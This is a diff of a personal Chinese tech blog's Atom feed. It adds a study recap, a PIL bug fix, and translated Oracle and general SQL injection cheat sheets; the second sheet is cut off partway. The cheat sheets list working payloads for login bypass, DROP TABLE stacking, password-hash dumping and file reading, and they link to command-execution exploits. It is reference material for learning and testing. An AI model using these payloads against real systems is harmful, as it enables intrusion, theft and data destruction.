@@ -4,7 +4,7 @@
   <title><![CDATA[雪地]]></title>
   <link href="http://yinzo.github.io/atom.xml" rel="self"/>
   <link href="http://yinzo.github.io/"/>
-  <updated>2016-04-17T01:43:50+08:00</updated>
+  <updated>2016-04-17T02:00:49+08:00</updated>
   <id>http://yinzo.github.io/</id>
   <author>
     <name><![CDATA[]]></name>
@@ -754,6 +754,1713 @@ ip-&gt;com_A-&gt;op
 
         /usr/bin/python /usr/local/bin/ssserver -c /etc/shadowsocks.json -d start
 </code></pre>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[2015暑假]]></title>
+    <link href="http://yinzo.github.io/14608288193470.html"/>
+    <updated>2016-04-17T01:46:59+08:00</updated>
+    <id>http://yinzo.github.io/14608288193470.html</id>
+    <content type="html"><![CDATA[
+<p><img src="http://ww3.sinaimg.cn/mw690/7d52f1ffgw1evo7tqd6huj21kw16ok59.jpg" alt="晒猫"/></p>
+
+<p>正式开始学习技术以来的第二个暑假了，上一个暑假的效率之高，可能没有什么机遇的话挺难超越的了。</p>
+
+<p>先放一张这次暑假一开始的计划图以及其完成度。<br/>
+<img src="http://ww4.sinaimg.cn/large/7d52f1ffgw1evo7tmpg20j20m507i3zp.jpg" alt="暑假计划"/></p>
+
+<span id="more"></span><!-- more -->
+
+<p>接下来一一说明</p>
+
+<ol>
+<li>暑假开始，第一个进行的是SmartQQBot的重构。这时已经回到了家中，主要都是在家里的42寸上完成的，效率不算太高，一个星期3K行左右的Python，主要时间花费在程序模块化逻辑的思考，以及优化二次开发流程上。</li>
+<li>接下来，开始花了两天的零散时间整理归纳了自己当前（当时）的技能树，里面漏掉了后端部分中的NodeJS枝，不过也不算很熟练，只是基本入门写了个小东西的水平，也就不追加到博文里了。</li>
+<li>深入学习Python。这一部分有少量在重构SmartQQBot的时候就开始了，主要使用<a href="http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000">廖雪峰的Python2.7教程</a>以及<a href="https://docs.python.org/2/">Python Documentation</a>，之所以没有标记为完成是因为没有固定的标准，在我看来Python值得我深入的地方还有很多，所以我选择标记为未完成。</li>
+<li>预习下学期内容。这个部分其实算是坑掉了，因为到后期时间不多、精力不够（懒）的原因，只看完了《啊哈！算法》并用Python实现了部分算法就没有深入下去了。</li>
+<li>深入学习SQL注入。主要使用Drops的大量注入相关文章，配合DVWA手工注入练习。基本了解了SQL注入的一些原理。（盲注还没来得及下手测试）期间在查阅资料的过程中顺手翻译了两篇文章，发到了Drops捞了一笔。标注为未完成的理由同Python。</li>
+<li>Cookie-Pot这个项目被我意外的坑掉了。因为在深入了Python和注入之后，发现自己对于前端的内容是越来越不感兴趣了。这样看来我未来的方向里已经排除掉了前端，顶多作为个人爱好再发展发展了。</li>
+<li>之后剩余了2周左右的时间，基本都在慢慢看《数学之美》。原本以为两周能看完的，但是里面NLP的部分完全理解需要的概率论知识我都不太记得了，而且课本没带回家，所以进度非常慢，算法理解度也不甚理想。</li>
+</ol>
+
+<p>除了以上计划中的内容，我还进行了以下活动</p>
+
+<ol>
+<li>暑假刚开始还没回家的两个星期。在学校接了一（两）单前端外包，大概也是因此对前端失去了部分兴趣。</li>
+<li>帮一个师兄的项目写了个简易的前端，算是第一次与他人合作进行配合开发。以前都是自己规划自己写后端自己写前端，没有太多与人合作开发的经历。（这个仍在进行）</li>
+</ol>
+
+<p>大概就是以上所写的内容了，可能有所遗漏，之后想起来再补充。</p>
+
+<p>啊对了，回学校之后还修证了一下博客的样式;D，新样式简洁多了</p>
+
+<p>总的来说效率算中上，完成度为80%。新的学期也有新的目标，希望能够尽快成长为能够实现自己脑中所有构思的人。</p>
+
+<p><img src="http://ww4.sinaimg.cn/mw690/7d52f1ffgw1evo7to77eaj21kw16o10g.jpg" alt="环境"/></p>
+
+<p>2015.09.02</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Oracle注入速查表]]></title>
+    <link href="http://yinzo.github.io/14608288508524.html"/>
+    <updated>2016-04-17T01:47:30+08:00</updated>
+    <id>http://yinzo.github.io/14608288508524.html</id>
+    <content type="html"><![CDATA[
+<p><small>本文由Yinzo翻译，转载请保留署名。原文地址：<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet">http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet</a></small></p>
+
+<p>注：下面的一部分查询只能由admin执行，我会在查询的末尾以&quot;<strong><code>-priv</code></strong>&ldquo;标注。</p>
+
+<span id="more"></span><!-- more -->
+
+<p>探测版本：</p>
+
+<pre><code>SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;
+SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;  
+SELECT version FROM v$instance;
+</code></pre>
+
+<p>注释：</p>
+
+<pre><code>SELECT 1 FROM dual — comment
+</code></pre>
+
+<p><em>注: Oracle的SELECT语句必须包含FROM从句，所以当我们并不是真的准备查询一个表的时候，我们必须使用一个假的表名‘dual’</em></p>
+
+<p>当前用户：</p>
+
+<pre><code>SELECT user FROM dual
+</code></pre>
+
+<p>列出所有用户：</p>
+
+<pre><code>SELECT username FROM all_users ORDER BY username;
+SELECT name FROM sys.user$; — priv
+</code></pre>
+
+<p>列出密码哈希：</p>
+
+<pre><code>SELECT name, password, astatus FROM sys.user$ — priv, &lt;= 10g.  astatus能够在acct被锁定的状态下给你反馈
+SELECT name,spare4 FROM sys.user$ — priv, 11g
+</code></pre>
+
+<p>密码破解：</p>
+
+<p><a href="http://www.red-database-security.com/software/checkpwd.html">checkpwd</a>能够把Oracle8,9,10的基于DES的哈希破解掉</p>
+
+<p>列出权限：</p>
+
+<pre><code>SELECT * FROM session_privs; —当前用户的权限
+SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; — priv, 列出指定用户的权限
+SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — priv, 找到拥有某个权限的用户
+SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;
+</code></pre>
+
+<p>列出DBA账户：</p>
+
+<pre><code>SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; — priv, 列出DBA和对应权限
+</code></pre>
+
+<p>当前数据库：</p>
+
+<pre><code>SELECT global_name FROM global_name;
+SELECT name FROM v$database;
+SELECT instance_name FROM v$instance;
+SELECT SYS.DATABASE_NAME FROM DUAL;
+</code></pre>
+
+<p>列出数据库：</p>
+
+<pre><code>SELECT DISTINCT owner FROM all_tables; — 列出数据库 (一个用户一个)
+</code></pre>
+
+<p>– 通过查询TNS监听程序能够查询到其他数据库.详情看<a href="http://www.jammed.com/%7Ejwa/hacks/security/tnscmd/tnscmd-doc.html">tnscmd</a>。</p>
+
+<p>列出字段名：</p>
+
+<pre><code>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;
+SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;
+</code></pre>
+
+<p>列出表名：</p>
+
+<pre><code>SELECT table_name FROM all_tables;
+SELECT owner, table_name FROM all_tables;
+</code></pre>
+
+<p>通过字段名找到对应表：</p>
+
+<pre><code>SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’;  
+</code></pre>
+
+<p>— 注: 表名都是大写</p>
+
+<p>查询第N行：</p>
+
+<pre><code>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; — 查询第9行(从1开始数)
+</code></pre>
+
+<p>查询第N个字符：</p>
+
+<pre><code>SELECT substr(‘abcd’, 3, 1) FROM dual; — 得到第三个字符‘c’
+</code></pre>
+
+<p>按位与(Bitwise AND)：</p>
+
+<pre><code>SELECT bitand(6,2) FROM dual; — 返回2
+SELECT bitand(6,1) FROM dual; — 返回0
+</code></pre>
+
+<p>ASCII值转字符：</p>
+
+<pre><code>SELECT chr(65) FROM dual; — 返回A
+</code></pre>
+
+<p>字符转ASCII码：</p>
+
+<pre><code>SELECT ascii(‘A’) FROM dual; — 返回65
+</code></pre>
+
+<p>类型转换：</p>
+
+<pre><code>SELECT CAST(1 AS char) FROM dual;
+SELECT CAST(’1′ AS int) FROM dual;
+</code></pre>
+
+<p>拼接字符：</p>
+
+<pre><code>SELECT ‘A’ || ‘B’ FROM dual; — 返回AB
+</code></pre>
+
+<p>IF语句：</p>
+
+<pre><code>BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; 
+</code></pre>
+
+<p>— 跟SELECT语句在一起时不太管用</p>
+
+<p>Case语句：</p>
+
+<pre><code>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — 返回1
+SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — 返回2
+</code></pre>
+
+<p>绕过引号：</p>
+
+<pre><code>SELECT chr(65) || chr(66) FROM dual; — 返回AB
+</code></pre>
+
+<p>延时：</p>
+
+<pre><code>BEGIN DBMS_LOCK.SLEEP(5); END; — priv, 在SELECT中用不了
+SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — 如果反查很慢
+SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — 如果正查很慢
+SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; — 如果发送TCP包被拦截或者很慢
+</code></pre>
+
+<p>— 更多关于延时的内容请看<a href="http://technet.microsoft.com/en-us/library/cc512676.aspx">Heavy Queries</a></p>
+
+<p>发送DNS请求：</p>
+
+<pre><code>SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;
+SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;
+</code></pre>
+
+<p>命令执行：</p>
+
+<p>如果目标机装了JAVA就能执行命令，<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">看这里</a></p>
+
+<p>有时候ExtProc也可以，不过我一般都成功不了，<a href="http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql">看这里</a></p>
+
+<p>本地文件读取：</p>
+
+<p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">UTL_FILE</a>有时候能用。如果下面的语句没有返回null就行。</p>
+
+<pre><code>SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;
+</code></pre>
+
+<p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">JAVA</a>能用来读取和写入文件，除了Oracle Express</p>
+
+<p>主机名称、IP地址：</p>
+
+<pre><code>SELECT UTL_INADDR.get_host_name FROM dual;
+SELECT host_name FROM v$instance;
+SELECT UTL_INADDR.get_host_address FROM dual; — 查IP
+SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — 查主机名称
+</code></pre>
+
+<p>定位DB文件：</p>
+
+<pre><code>SELECT name FROM V$DATAFILE;
+</code></pre>
+
+<p>默认系统和数据库：</p>
+
+<pre><code>SYSTEM
+SYSAUX
+</code></pre>
+
+<h3 id="toc_0">额外小贴士：</h3>
+
+<p>一个字符串列出所有表名：</p>
+
+<pre><code>select rtrim(xmlagg(xmlelement(e, table_name || ‘,’)).extract(‘//text()’).extract(‘//text()’) ,’,&#39;) from all_tables 
+</code></pre>
+
+<p>– 当你union联查注入的时候只有一行能用与返回数据时使用</p>
+
+<p>盲注排序：</p>
+
+<pre><code>order by case when ((select 1 from user_tables where substr(lower(table_name), 1, 1) = ‘a’ and rownum = 1)=1) then column_name1 else column_name2 end 
+</code></pre>
+
+<p>— 你必须知道两个拥有相同数据类型的字段名才能用</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[解决Python的pytesseract库执行时报错]]></title>
+    <link href="http://yinzo.github.io/14608288742293.html"/>
+    <updated>2016-04-17T01:47:54+08:00</updated>
+    <id>http://yinzo.github.io/14608288742293.html</id>
+    <content type="html"><![CDATA[
+<p>使用pytesseract库识别验证码时遇到以下报错</p>
+
+<pre><code>AttributeError: &#39;NoneType&#39; object has no attribute &#39;bands&#39;
+</code></pre>
+
+<p>修改PIL库<code>site-packages/PIL/Image.py</code>1496行</p>
+
+<pre><code>def split(self):
+    “Split image into bands”
+
+    if self.im.bands == 1:
+</code></pre>
+
+<p>为</p>
+
+<pre><code>def split(self):
+    “Split image into bands”
+    self.load()
+    if self.im.bands == 1:
+</code></pre>
+
+<p>即可。</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[SQL注入速查表]]></title>
+    <link href="http://yinzo.github.io/14608288854459.html"/>
+    <updated>2016-04-17T01:48:05+08:00</updated>
+    <id>http://yinzo.github.io/14608288854459.html</id>
+    <content type="html"><![CDATA[
+<p><small><em>本文由Yinzo翻译，转载请保留署名。原文地址：<a href="http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell">http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell</a></em></small></p>
+
+<p><small><em>文档版本：1.4</em></small></p>
+
+<h2 id="toc_0">关于SQL注入速查表</h2>
+
+<p>现在仅支持MySQL、Microsoft SQL Server，以及一部分ORACLE和PostgreSQL。大部分样例都不能保证每一个场景都适用。现实场景由于各种插入语、不同的代码环境以及各种不常见甚至奇特的SQL语句，而经常发生变化。</p>
+
+<p>样例仅用于读者理解对于“可能出现的攻击(a potential attack)”的基础概念，并且几乎每一个部分都有一段简洁的概要</p>
+
+<span id="more"></span><!-- more -->
+
+<ul>
+<li>M:    MySQL</li>
+<li>S: SQL Server</li>
+<li>P:    PostgreSQL</li>
+<li>O:    Oracle</li>
+<li>+: (大概)其他所有数据库</li>
+</ul>
+
+<p><em>例子</em>：</p>
+
+<ul>
+<li>(MS) 代表 : MySQL 和 SQL Server 等</li>
+<li>(M*S) 代表 : 仅对某些版本或者某些附在后文中的特殊情况的 MySQL，以及SQL Server</li>
+</ul>
+
+<h2 id="toc_1">目录</h2>
+
+<ol>
+<li>关于SQL注入速查表</li>
+<li>语法参考，攻击样例以及注入小技巧
+
+<ol>
+<li>行间注释
+
+<ol>
+<li>使用了行间注释的SQL注入攻击样例</li>
+</ol></li>
+<li>行内注释
+
+<ol>
+<li>使用了行内注释的注入攻击样例</li>
+<li>MySQL版本探测攻击样例</li>
+</ol></li>
+<li>堆叠查询(Stacking Queries)
+
+<ol>
+<li>支持堆叠查询的语言/数据库</li>
+<li>关于MySQL和PHP</li>
+<li>堆叠注入攻击样例</li>
+</ol></li>
+<li>If语句
+
+<ol>
+<li>MySQL的If语句</li>
+<li>SQL Server的If语句</li>
+<li>使用了If语句的注入攻击样例</li>
+</ol></li>
+<li>整数(Integers)的使用</li>
+<li>字符串操作
+
+<ol>
+<li>字符串的串联</li>
+</ol></li>
+<li>没有引号的字符串
+
+<ol>
+<li>使用了16进制的注入攻击样例</li>
+</ol></li>
+<li>字符串异化(Modification)与联系</li>
+<li>Union注入
+
+<ol>
+<li>UNION-语言问题处理</li>
+</ol></li>
+<li>绕过登陆界面(SMO+)</li>
+<li>绕过检查MD5哈希的登陆界面
+
+<ol>
+<li>绕过MD5哈希检查的例子(MSP)</li>
+</ol></li>
+<li>基于错误(Error Based)-探测字段名
+
+<ol>
+<li>使用<code>HAVING</code>来探测字段名(S)</li>
+<li>在<code>SELECT</code>查询中使用<code>ORDER BY</code>探测字段数(MSO+)</li>
+</ol></li>
+<li>数据类型、UNION、之类的
+
+<ol>
+<li>获取字段类型</li>
+</ol></li>
+<li>简单的注入(MSO+)</li>
+<li>有用的函数、信息收集、内置程序、大量注入笔记
+
+<ol>
+<li><code>@@version</code>(MS)</li>
+<li>文件插入(Bulk Insert)(S)</li>
+<li>BCP(S)</li>
+<li>SQL Server的VBS/WSH(S)</li>
+<li>执行系统命令，xp_cmdshell(S)</li>
+<li>SQL Server中的一些特殊的表(S)</li>
+<li>SQL Server的其它内置程序(S)</li>
+<li>大量MSSQL笔记</li>
+<li>使用LIMIT(M)或ORDER(MSO)的注入</li>
+<li>关掉SQL Server(S)</li>
+</ol></li>
+<li>在SQL Server 2005中启用xp_cmdshell</li>
+<li>探测SQL Server数据库的结构(S)
+
+<ol>
+<li>获取用户定义表</li>
+<li>获取字段名</li>
+</ol></li>
+<li>移动记录(Moving records)(S)</li>
+<li>快速的脱掉基于错误(Error Based)的SQL Server注入(S)</li>
+<li>盲注
+
+<ol>
+<li>关于盲注</li>
+<li>实战中的盲注实例</li>
+</ol></li>
+<li>延时盲注
+
+<ol>
+<li><code>WAITFOR DELAY [time]</code>(S)</li>
+<li>实例</li>
+<li><code>BENCHMARK()</code>(M)</li>
+<li>实例</li>
+<li><code>pg_sleep(seconds)</code>(P)</li>
+</ol></li>
+<li>掩盖痕迹
+
+<ol>
+<li><code>-sp_password log bypass</code>(S)</li>
+</ol></li>
+<li>注入测试</li>
+<li>一些其他的MySQL笔记
+
+<ol>
+<li>MySQL中好用的函数</li>
+</ol></li>
+<li>SQL注入的高级使用
+
+<ol>
+<li>强制SQL Server来得到NTLM哈希</li>
+<li>Bulk insert UNC共享文件 (S) </li>
+</ol></li>
+</ol></li>
+<li>待办事项 / 联系方式 / 帮助</li>
+</ol>
+
+<h2 id="toc_2">语法参考，攻击样例以及注入小技巧</h2>
+
+<h3 id="toc_3">行间注释</h3>
+
+<p><strong>注释掉查询语句的其余部分</strong><br/>
+行间注释通常用于注释掉查询语句的其余部分，这样你就不需要去修复整句语法了。</p>
+
+<ul>
+<li><p><code>--</code>(SM)</p>
+
+<p><code>DROP sampletable;--</code></p></li>
+<li><p><code>#</code>(M)</p>
+
+<p><code>DROP sampletable;#</code></p></li>
+</ul>
+
+<h4 id="toc_4">使用了行间注释的SQL注入攻击样例</h4>
+
+<blockquote>
+<p>用户名:<code>admin&#39;--</code></p>
+</blockquote>
+
+<ul>
+<li>构成语句:<code>SELECT * FROM members WHERE username = &#39;admin&#39;--&#39; AND password = &#39;password&#39;</code>
+这会使你以admin身份登陆，因为其余部分的SQL语句被注释掉了。</li>
+</ul>
+
+<h3 id="toc_5">行内注释</h3>
+
+<p><strong>通过不关闭注释注释掉查询语句的其余部分</strong>，或者用于<strong>绕过过滤</strong>，移除空格，混淆，或探测数据库版本。</p>
+
+<ul>
+<li><code>/*注释内容*/</code>(SM)
+
+<ul>
+<li><code>DROP/*comment*/sampletable</code></li>
+<li><code>DR/**/OP/*绕过过滤*/sampletable</code></li>
+<li><code>SELECT/*替换空格*/password/**/FROM/**/Members</code></li>
+</ul></li>
+<li><p><code>/*! MYSQL专属 */</code> (M) </p>
+
+<p>这是个MySQL专属语法。非常适合用于探测MySQL版本。如果你在注释中写入代码，只有MySQL才会执行。同样的你也可以用这招，使得只有高于某版本的服务器才执行某些代码。<br/>
+<code>SELECT /*!32302 1/0, */ 1 FROM tablename</code></p></li>
+</ul>
+
+<h4 id="toc_6">使用了行内注释的注入攻击样例</h4>
+
+<blockquote>
+<p>ID:<code>10; DROP TABLE members /*</code></p>
+</blockquote>
+
+<p>简单地摆脱了处理后续语句的麻烦，同样你可以使用<code>10; DROP TABLE members --</code></p>
+
+<h4 id="toc_7">MySQL版本探测攻击样例</h4>
+
+<blockquote>
+<p><code>SELECT /*!32302 1/0, */ 1 FROM tablename</code></p>
+</blockquote>
+
+<p>如果MySQL的版本高于<strong>3.23.02</strong>，会抛出一个<code>division by 0 error</code></p>
+
+<blockquote>
+<p>ID:<code>/*!32302 10*/</code></p>
+
+<p>ID:<code>10</code></p>
+</blockquote>
+
+<p>如果MySQL版本高于3.23.02，以上两次查询你将得到相同的结果</p>
+
+<h3 id="toc_8">堆叠查询(Stacking Queries)</h3>
+
+<p><strong>一句代码之中执行多个查询语句</strong>，这在每一个注入点都非常有用，尤其是使用SQL Server后端的应用</p>
+
+<ul>
+<li><code>;</code>(S)
+<code>SELECT * FROM members; DROP members--</code>
+结束一个查询并开始一个新的查询</li>
+</ul>
+
+<h4 id="toc_9">支持堆叠查询的语言/数据库</h4>
+
+<p><strong>绿色：</strong>支持，<strong>暗灰色：</strong>不支持，<strong>浅灰色：</strong>未知<br/>
+<img src="http://ww2.sinaimg.cn/large/7d52f1ffgw1euwiy9impsj20dn03sgls.jpg" alt="支持堆叠查询的语言/数据库"/></p>
+
+<h4 id="toc_10">关于MySQL和PHP</h4>
+
+<p>阐明一些问题。</p>
+
+<p><strong>PHP-MySQL不支持堆叠查询</strong>，Java不支持堆叠查询（ORACLE的我很清楚，其他的就不确定了）。一般来说MySQL支持堆叠查询，但由于大多数PHP-Mysql应用框架的数据库层都不能执行第二条查询，或许MySQL的客户端支持这个，我不确定，有人能确认一下吗？</p>
+
+<p><em>（译者注：MySQL 5.6.20版本下客户端支持堆叠查询）</em></p>
+
+<h4 id="toc_11">堆叠注入攻击样例</h4>
+
+<blockquote>
+<p>ID:<code>10;DROP members --</code></p>
+</blockquote>
+
+<p>构成语句：<code>SELECT * FROM products WHERE id = 10; DROP members--</code></p>
+
+<p>这在执行完正常查询之后将会执行DROP查询。</p>
+
+<h3 id="toc_12">If语句</h3>
+
+<p>根据If语句得到响应。这是<strong>盲注(Blind SQL Injection)的关键之一</strong>，同样也能简单而<strong>准确地</strong>进行一些测试。</p>
+
+<h4 id="toc_13">MySQL的If语句</h4>
+
+<ul>
+<li><p><code>IF(condition,true-part,false-part)</code>(M)</p>
+
+<blockquote>
+<p><code>SELECT IF (1=1,&#39;true&#39;,&#39;false&#39;)</code></p>
+</blockquote></li>
+</ul>
+
+<h4 id="toc_14">SQL Server的If语句</h4>
+
+<ul>
+<li><p><code>IF condition true-part ELSE false-part</code>(S)</p>
+
+<blockquote>
+<p><code>IF (1=1) SELECT &#39;true&#39; ELSE SELECT &#39;false&#39;</code></p>
+</blockquote></li>
+</ul>
+
+<h4 id="toc_15">使用了If语句的注入攻击样例</h4>
+
+<blockquote>
+<p><code>if ((select user) = &#39;sa&#39; OR (select user) = &#39;dbo&#39;) select 1 else select 1/0</code>(S)</p>
+</blockquote>
+
+<p>如果当前用户不是<strong>&ldquo;sa&quot;或者&quot;dbo&rdquo;</strong>,就会抛出一个<strong><code>divide by zero error</code></strong>。</p>
+
+<h3 id="toc_16">整数(Integers)的使用</h3>
+
+<p>对于绕过十分有用，比如<strong>magic_quotes() 和其他类似过滤器</strong>，甚至是各种WAF。</p>
+
+<ul>
+<li><p><code>0xHEXNUMBER</code>(SM)</p>
+
+<p>(HEXNUMBER:16进制数）<br/>
+你能这样使用16进制数：</p>
+
+<ul>
+<li><p><code>SELECT CHAR(0x66)</code>(S)</p></li>
+<li><p><code>SELECT 0x5045</code>(M) (这不是一个整数，而会是一个16进制字符串）</p></li>
+<li><p><code>SELECT 0x50 + 0x45</code>(M) (现在这是整数了)</p></li>
+</ul></li>
+</ul>
+
+<h3 id="toc_17">字符串操作</h3>
+
+<p>与字符串相关的操作。这对于构造一个不含有引号，用于绕过或探测数据库都非常的有用。</p>
+
+<h4 id="toc_18">字符串的串联</h4>
+
+<ul>
+<li><p><code>+</code>(S)</p>
+
+<p><code>SELECT login + &#39;-&#39; + password FROM members</code></p></li>
+<li><p><code>||</code> (*MO) </p>
+
+<p><code>SELECT login || &#39;-&#39; || password FROM members</code></p></li>
+</ul>
+
+<p>*<strong>关于MySQL的&quot;||&ldquo;</strong><br/>
+这个仅在ANSI模式下的MySQL执行，其他情况下都会当成&#39;逻辑操作符&#39;并返回一个0。更好的做法是使用<code>CONCAT()</code>函数。</p>
+
+<ul>
+<li><p><code>CONCAT(str1, str2, str3, ...)</code>(M)</p>
+
+<p>连接参数里的所有字符串<br/>
+例：<code>SELECT CONCAT(login, password) FROM members</code></p></li>
+</ul>
+
+<h3 id="toc_19">没有引号的字符串</h3>
+
+<p>有很多使用字符串的方法，但是这几个方法是一直可用的。使用<code>CHAR()</code>(MS)和<code>CONCAT()</code>(M)来生成没有引号的字符串</p>
+
+<ul>
+<li><p><code>0x457578</code> (M) - 16进制编码的字符串</p>
+
+<p><code>SELECT 0x457578</code></p>
+
+<p>这在MySQL中会被当做字符串处理</p></li>
+<li><p>在MySQL中使用16进制字符串的一个简单方式：<br/>
+<code>SELECT CONCAT(&#39;0x&#39;,HEX(&#39;c:\\boot.ini&#39;))</code></p></li>
+<li><p>在MySQL中使用<code>CONCAT()</code>函数：<br/>
+<code>SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))</code> (M) </p>
+
+<p>这会返回&#39;KLM&#39;</p></li>
+<li><p><code>SELECT CHAR(75)+CHAR(76)+CHAR(77)</code> (S) </p>
+
+<p>这会返回&#39;KLM&#39;</p></li>
+</ul>
+
+<h4 id="toc_20">使用了16进制的注入攻击样例</h4>
+
+<ul>
+<li><p><code>SELECT LOAD_FILE(0x633A5C626F6F742E696E69)</code> (M) </p>
+
+<p>这会显示<strong>c:\boot.ini</strong>的内容</p></li>
+</ul>
+
+<h3 id="toc_21">字符串异化(Modification)与联系</h3>
+
+<ul>
+<li><p><code>ASCII()</code> (SMP) </p>
+
+<p>返回最左边字符的ASCII码的值。这是一个用于盲注的重要函数。</p>
+
+<p>例：<code>SELECT ASCII(&#39;a&#39;)</code></p></li>
+<li><p><code>CHAR()</code> (SM) </p>
+
+<p>把整数转换为对应ASCII码的字符</p>
+
+<p>例：<code>SELECT CHAR(64)</code></p></li>
+</ul>
+
+<h3 id="toc_22">Union注入</h3>
+
+<p>通过union你能跨表执行查询。最简单的，你能注入一个查询使得它返回另一个表的内容。<br/>
+<code>SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members</code></p>
+
+<p>这会把news表和members表的内容合并返回。</p>
+
+<p>另一个例子：<br/>
+<code>&#39; UNION SELECT 1, &#39;anotheruser&#39;, &#39;doesnt matter&#39;, 1--</code></p>
+
+<h4 id="toc_23">UNION-语言问题处理</h4>
+
+<p>当你使用Union来注入的时候，经常会遇到一些错误，这是由于不同的语言的设置（表的设置、字段设置、表或数据库的设置等等）。这些办法对于解决那些问题都挺有用的，尤其是当你处理日文，俄文，土耳其文的时候你会就会见到他们的。</p>
+
+<ul>
+<li><p>使用 <code>COLLATE SQL_Latin1_General_Cp1254_CS_AS</code>(S)</p>
+
+<p>或者其它的什么语句，具体的自己去查SQL Server的文档。<br/>
+例：<code>SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members</code></p></li>
+<li><p><code>Hex()</code>(M)</p>
+
+<p>百试百灵~</p></li>
+</ul>
+
+<h3 id="toc_24">绕过登陆界面(SMO+)</h3>
+
+<p><em>SQL注入101式</em>(大概是原文名字吧？),登陆小技巧</p>
+
+<ul>
+<li><code>admin&#39; --</code></li>
+<li><code>admin&#39; #</code></li>
+<li><code>admin&#39;/*</code></li>
+<li><code>&#39; or 1=1--</code></li>
+<li><code>&#39; or 1=1#</code></li>
+<li><code>&#39; or 1=1/*</code></li>
+<li><code>&#39;) or &#39;1&#39;=&#39;1--</code></li>
+<li><code>&#39;) or (&#39;1&#39;=&#39;1--</code></li>
+<li>&hellip;.</li>
+<li>以不同的用户登陆 (SM*) 
+<code>&#39; UNION SELECT 1, &#39;anotheruser&#39;, &#39;doesnt matter&#39;, 1--</code></li>
+</ul>
+
+<p>*<em>旧版本的MySQL不支持union</em></p>
+
+<h3 id="toc_25">绕过检查MD5哈希的登陆界面</h3>
+
+<p>如果应用是先通过用户名，读取密码的MD5，然后和你提供的密码的MD5进行比较，那么你就需要一些额外的技巧才能绕过验证。你可以把一个已知明文的MD5哈希和它的明文一起提交，使得程序不使用从数据库中读取的哈希，而使用你提供的哈希进行比较。</p>
+
+<h4 id="toc_26">绕过MD5哈希检查的例子(MSP)</h4>
+
+<blockquote>
+<p>用户名：<code>admin</code></p>
+
+<p>密码：<code>1234 &#39; AND 1=0 UNION ALL SELECT &#39;admin&#39;,&#39;81dc9bdb52d04dc20036dbd8313ed055</code></p>
+</blockquote>
+
+<p>其中<code>81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)</code></p>
+
+<h3 id="toc_27">基于错误(Error Based)-探测字段名</h3>
+
+<h4 id="toc_28">使用<code>HAVING</code>来探测字段名(S)</h4>
+
+<ul>
+<li><code>&#39; HAVING 1=1 --</code></li>
+<li><code>&#39; GROUP BY table.columnfromerror1 HAVING 1=1 --</code></li>
+<li><code>&#39; GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --</code></li>
+<li>……</li>
+<li><code>&#39; GROUP BY table.columnfromerror1, columnfromerror2,columnfromerror(n) HAVING 1=1 --</code></li>
+<li>直到它不再报错，就算搞定了</li>
+</ul>
+
+<h4 id="toc_29">在<code>SELECT</code>查询中使用<code>ORDER BY</code>探测字段数(MSO+)</h4>
+
+<p>通过ORDER BY来探测字段数能够加快union注入的速度。</p>
+
+<ul>
+<li><code>ORDER BY 1--</code></li>
+<li><code>ORDER BY 2--</code></li>
+<li>……</li>
+<li><code>ORDER BY N--</code> </li>
+<li>一直到它报错为止，最后一个成功的数字就是字段数。</li>
+</ul>
+
+<h3 id="toc_30">数据类型、UNION、之类的</h3>
+
+<p><strong>提示：</strong></p>
+
+<ul>
+<li>经常给<strong>UNION</strong>配上<strong>ALL</strong>使用，因为经常会有相同数值的字段，而缺省情况下UNION都会尝试返回唯一值(records with distinct)</li>
+<li>如果你每次查询只能有一条记录，而你不想让原本正常查询的记录占用这宝贵的记录位，你可以使用<code>-1</code>或者根本不存在的值来搞定原查询（前提是注入点在WHERE里）。</li>
+<li>在UNION中使用NULL，对于大部分数据类型来说这样都比瞎猜字符串、日期、数字之类的来得强
+
+<ul>
+<li>盲注的时候要小心判断错误是来自应用的还是来自数据库的。因为像ASP.NET就经常会在你使用NULL的时候抛出错误（因为开发者们一般都没想到用户名的框中会出现NULL）</li>
+</ul></li>
+</ul>
+
